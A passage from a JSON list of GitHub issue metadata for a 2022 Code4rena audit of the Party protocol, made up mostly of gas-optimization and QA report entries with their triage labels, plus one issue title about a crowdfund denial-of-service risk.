"low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/59", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/57", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/55", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/54", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/53", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor disputed"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/52", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor disputed"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Malicious contributor may DOS crowdfund, trapping all assets within a crowdfund.", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/51", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Malicious contributor may DOS crowdfund, trapping all assets within a crowdfund."}]